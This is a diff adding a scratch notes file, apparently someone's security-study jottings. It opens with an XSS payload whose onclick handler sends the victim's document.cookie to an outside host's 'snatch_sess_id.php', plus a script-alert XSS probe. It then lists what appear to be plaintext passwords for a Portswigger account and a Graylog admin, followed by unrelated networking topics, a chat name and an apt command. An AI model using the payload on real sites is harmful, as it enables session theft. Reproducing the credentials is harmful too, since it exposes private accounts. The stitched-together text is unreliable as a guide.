@@ -1,0 +1,19 @@
+<a href=# onclick=\”document.location=\’http://techpanda.org/snatch_sess_id.php?c=\’+escape\(document.cookie\)\;\”>Dark</a>
+
+"><script>alert(String.fromCharCode(88,83,83))</script>\
+
+
+
+Portswigger password
+88n]8EZ*56+]z)\7z"6eE4[$7$&s6iG[
+greylog admin
+arthi2016
+
+
+OSI Model \
+IP model
+Private vs Public IP
+VPN connection
+Firewalls
+Saptak Saha1:18 PM
+apt search openjdk-17
